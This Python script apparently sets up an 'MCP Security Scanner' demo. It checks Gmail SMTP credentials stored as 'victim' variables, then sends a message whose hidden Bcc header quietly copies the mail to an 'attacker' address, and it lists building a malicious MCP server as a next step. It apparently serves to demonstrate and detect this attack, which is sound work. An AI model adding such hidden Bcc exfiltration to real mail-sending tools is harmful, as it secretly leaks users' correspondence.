#!/usr/bin/env python3
"""
Complete Email Testing Script
Tests SMTP connection and shows detailed results
"""

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
from dotenv import load_dotenv
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
import time

console = Console()

# Load environment variables
load_dotenv()

def validate_env_variables():
    """Check if all required environment variables are set"""
    
    console.print("\n[bold cyan]🔍 Step 1: Validating Environment Variables[/bold cyan]\n")
    
    victim_email = os.getenv("VICTIM_EMAIL")
    victim_password = os.getenv("VICTIM_APP_PASSWORD")
    attacker_email = os.getenv("ATTACKER_EMAIL")
    
    # Create validation table
    table = Table(title="Environment Variables Check")
    table.add_column("Variable", style="cyan")
    table.add_column("Status", style="green")
    table.add_column("Value/Issue", style="yellow")
    
    all_valid = True
    
    # Check VICTIM_EMAIL
    if victim_email:
        table.add_row("VICTIM_EMAIL", "✓ Found", victim_email)
    else:
        table.add_row("VICTIM_EMAIL", "✗ Missing", "Not found in .env")
        all_valid = False
    
    # Check VICTIM_APP_PASSWORD
    if victim_password:
        # Remove spaces for checking
        clean_password = victim_password.replace(" ", "")
        password_display = "*" * len(clean_password)
        
        if " " in victim_password:
            table.add_row(
                "VICTIM_APP_PASSWORD", 
                "⚠ Has spaces", 
                f"{password_display} ({len(clean_password)} chars) - SPACES DETECTED!"
            )
            console.print("\n[yellow]⚠️  WARNING: Your app password has spaces![/yellow]")
            console.print("[yellow]   I'll remove them automatically, but you should fix your .env file.[/yellow]\n")
        elif len(clean_password) != 16:
            table.add_row(
                "VICTIM_APP_PASSWORD", 
                "⚠ Wrong length", 
                f"{password_display} ({len(clean_password)} chars) - Should be 16!"
            )
            all_valid = False
        else:
            table.add_row(
                "VICTIM_APP_PASSWORD", 
                "✓ Valid", 
                f"{password_display} (16 chars)"
            )
    else:
        table.add_row("VICTIM_APP_PASSWORD", "✗ Missing", "Not found in .env")
        all_valid = False
    
    # Check ATTACKER_EMAIL
    if attacker_email:
        table.add_row("ATTACKER_EMAIL", "✓ Found", attacker_email)
    else:
        table.add_row("ATTACKER_EMAIL", "✗ Missing", "Not found in .env")
        all_valid = False
    
    console.print(table)
    console.print()
    
    if not all_valid:
        console.print(Panel(
            "[bold red]❌ Environment validation failed![/bold red]\n\n"
            "Please check your .env file and make sure all variables are set correctly.",
            title="⚠️  Configuration Error",
            border_style="red"
        ))
        return None, None, None
    
    # Return cleaned password (without spaces)
    return victim_email, victim_password.replace(" ", ""), attacker_email


def test_smtp_connection(victim_email, victim_password, attacker_email):
    """Test SMTP connection step by step"""
    
    console.print("[bold cyan]🔌 Step 2: Testing SMTP Connection[/bold cyan]\n")
    
    steps_completed = []
    
    try:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            
            # Step 1: Connect
            task1 = progress.add_task("[cyan]Connecting to smtp.gmail.com:587...", total=None)
            try:
                server = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
                server.set_debuglevel(0)
                time.sleep(1)
                progress.update(task1, completed=True)
                steps_completed.append("✓ Connected to Gmail SMTP server")
            except Exception as e:
                progress.update(task1, completed=True)
                console.print(f"\n[red]✗ Connection failed: {e}[/red]")
                return False, steps_completed
            
            # Step 2: Start TLS
            task2 = progress.add_task("[cyan]Starting TLS encryption...", total=None)
            try:
                server.starttls()
                time.sleep(1)
                progress.update(task2, completed=True)
                steps_completed.append("✓ TLS encryption enabled")
            except Exception as e:
                progress.update(task2, completed=True)
                console.print(f"\n[red]✗ TLS failed: {e}[/red]")
                return False, steps_completed
            
            # Step 3: Login
            task3 = progress.add_task("[cyan]Authenticating with app password...", total=None)
            try:
                server.login(victim_email, victim_password)
                time.sleep(1)
                progress.update(task3, completed=True)
                steps_completed.append("✓ Authentication successful")
            except smtplib.SMTPAuthenticationError as e:
                progress.update(task3, completed=True)
                console.print(f"\n[red]✗ Authentication failed: {e}[/red]")
                console.print("\n[yellow]Common fixes:[/yellow]")
                console.print("  1. Check your app password is correct")
                console.print("  2. Remove ALL spaces from the password")
                console.print("  3. Make sure 2-Step Verification is enabled")
                console.print("  4. Try generating a new app password")
                return False, steps_completed
            except Exception as e:
                progress.update(task3, completed=True)
                console.print(f"\n[red]✗ Authentication error: {e}[/red]")
                return False, steps_completed
            
            # Step 4: Create and send email
            task4 = progress.add_task("[cyan]Sending test email...", total=None)
            try:
                msg = MIMEMultipart()
                msg['From'] = victim_email
                msg['To'] = attacker_email
                msg['Subject'] = "✅ MCP Scanner - Email Test Successful!"
                
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                
                body = f"""
🎉 SUCCESS! Your email configuration is working perfectly!

Test Details:
─────────────────────────────────────────
From: {victim_email}
To: {attacker_email}
Sent: {timestamp}
Method: SMTP via Gmail
─────────────────────────────────────────

What this means:
✓ Your Gmail SMTP credentials are valid
✓ App password is configured correctly
✓ Connection is secure (TLS enabled)
✓ You can send emails programmatically

Next Steps:
1. Build the malicious MCP server
2. Create the scanner tool
3. Set up the attack demo
4. Integrate with front-end

You're ready to start building! 🚀

---
This is an automated test email from the MCP Security Scanner project.
"""
                
                msg.attach(MIMEText(body, 'plain'))
                server.send_message(msg)
                time.sleep(1)
                progress.update(task4, completed=True)
                steps_completed.append("✓ Test email sent")
                
                server.quit()
                steps_completed.append("✓ Connection closed")
                
            except Exception as e:
                progress.update(task4, completed=True)
                console.print(f"\n[red]✗ Failed to send email: {e}[/red]")
                return False, steps_completed
        
        return True, steps_completed
        
    except Exception as e:
        console.print(f"\n[red]✗ Unexpected error: {e}[/red]")
        return False, steps_completed


def test_attack_scenario(victim_email, victim_password, attacker_email):
    """Test the actual attack scenario (BCC to attacker)"""
    
    console.print("\n[bold cyan]🎭 Step 3: Testing Attack Scenario (BCC)[/bold cyan]\n")
    console.print("[yellow]This simulates what happens in the actual attack...[/yellow]\n")
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        server.starttls()
        server.login(victim_email, victim_password)
        
        # Create message that looks normal but has hidden BCC
        msg = MIMEMultipart()
        msg['From'] = victim_email
        msg['To'] = "bob@example.com"  # Fake recipient (won't actually send)
        msg['Subject'] = "🎭 Attack Demo - This would be hijacked!"
        
        # Add secret BCC (this is the attack!)
        msg['Bcc'] = attacker_email
        
        body = f"""
This is a test of the attack scenario.

What the user sees:
  To: bob@example.com
  
What actually happens:
  To: bob@example.com
  BCC: {attacker_email} ← SECRET COPY TO ATTACKER!

In a real attack, the user wouldn't know about the BCC.
The attacker would receive a copy of every email sent.
"""
        
        msg.attach(MIMEText(body, 'plain'))
        
        # Send only to attacker (we don't have bob@example.com)
        server.sendmail(victim_email, [attacker_email], msg.as_string())
        server.quit()
        
        console.print("[green]✓ Attack scenario test completed![/green]")
        console.print(f"[yellow]  Check {attacker_email} for the 'attack demo' email[/yellow]\n")
        
        return True
        
    except Exception as e:
        console.print(f"[red]✗ Attack scenario test failed: {e}[/red]\n")
        return False


def main():
    """Main test function"""
    
    console.print("""
[bold cyan]
╔════════════════════════════════════════╗
║   MCP Security Scanner Email Test     ║
║   Complete Validation Suite           ║
╚════════════════════════════════════════╝
[/bold cyan]
    """)
    
    # Step 1: Validate environment
    victim_email, victim_password, attacker_email = validate_env_variables()
    
    if not all([victim_email, victim_password, attacker_email]):
        console.print("\n[red]❌ Cannot proceed without valid environment variables[/red]\n")
        return
    
    # Step 2: Test SMTP connection
    smtp_success, steps = test_smtp_connection(victim_email, victim_password, attacker_email)
    
    # Show what completed
    console.print("\n[bold]Connection Steps:[/bold]")
    for step in steps:
        console.print(f"  {step}")
    console.print()
    
    if not smtp_success:
        console.print(Panel(
            "[bold red]❌ SMTP test failed![/bold red]\n\n"
            "Please fix the issues above and try again.",
            title="⚠️  Test Failed",
            border_style="red"
        ))
        return
    
    # Step 3: Test attack scenario
    attack_success = test_attack_scenario(victim_email, victim_password, attacker_email)
    
    # Final summary
    console.print("\n" + "="*50 + "\n")
    
    if smtp_success and attack_success:
        console.print(Panel(
            f"[bold green]🎉 ALL TESTS PASSED![/bold green]\n\n"
            f"✅ Environment variables configured\n"
            f"✅ SMTP connection successful\n"
            f"✅ Authentication working\n"
            f"✅ Test emails sent\n"
            f"✅ Attack scenario tested\n\n"
            f"[cyan]Check your inbox:[/cyan]\n"
            f"  📧 {attacker_email}\n\n"
            f"You should see 2 emails:\n"
            f"  1. '✅ MCP Scanner - Email Test Successful!'\n"
            f"  2. '🎭 Attack Demo - This would be hijacked!'\n\n"
            f"[bold]Next Steps:[/bold]\n"
            f"  → Build the malicious MCP server\n"
            f"  → Create the scanner tool\n"
            f"  → Set up the demo\n\n"
            f"[bold green]You're ready to start building! 🚀[/bold green]",
            title="✅ Complete Success",
            border_style="green",
            padding=(1, 2)
        ))
    else:
        console.print(Panel(
            "[bold red]❌ Some tests failed[/bold red]\n\n"
            "Please check the errors above and fix them before proceeding.",
            title="⚠️  Tests Incomplete",
            border_style="red"
        ))


if __name__ == "__main__":
    main()